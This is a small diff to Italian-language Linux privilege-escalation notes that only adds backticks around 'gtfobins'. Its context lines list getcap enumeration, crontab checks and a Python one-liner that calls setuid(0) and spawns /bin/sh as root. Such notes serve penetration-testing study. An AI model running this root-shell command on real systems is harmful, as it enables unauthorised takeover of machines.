@@ -20,7 +20,7 @@
 - usare le capabilities per fare `suid` o `guid`
 	- `getcap -r / 2>/dev/null`
 		- cerca le capabilities dentro il sistema
-		- cerca la capability dentro gtfobins
+		- cerca la capability dentro `gtfobins`
 		- `python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'`
 - uso dei crontab
 	- `crontab -l`
